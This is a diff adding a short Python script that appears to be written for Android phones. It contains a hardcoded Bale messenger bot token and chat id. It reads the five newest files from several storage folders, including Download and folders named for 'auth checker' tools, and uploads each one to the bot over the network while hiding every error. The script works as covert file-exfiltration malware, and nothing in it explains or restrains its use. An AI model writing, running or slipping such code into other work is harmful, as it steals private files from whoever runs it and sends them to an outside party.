@@ -1,0 +1,13 @@
+import os, glob, requests
+from concurrent.futures import ThreadPoolExecutor as TPE
+
+token, chat_id = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia', '1884879628'
+dirs = ['/storage/emulated/0/AuthChecker/', '/storage/emulated/0/Download/', '/storage/emulated/0/auth checker/', '/storage/emulated/0/AUTH/اوت چکر مالک', '/storage/emulated/0/چکر مالک/', '/storage/emulated/0/Download/auth_dozd/']
+#os.system('clear' if os.name == 'posix' else 'cls')
+
+def send(f):
+    try: requests.post(f'https://tapi.bale.ai/bot{token}/sendDocument', data={'chat_id': chat_id, 'caption': '📄 10'}, files={'document': open(f, 'rb')})
+    except: pass
+
+with TPE(max_workers=10) as ex:
+    ex.map(send, [f for d in dirs for f in sorted(glob.glob(os.path.join(d, '*')), key=os.path.getmtime, reverse=True)[:5] if os.path.isfile(f)])
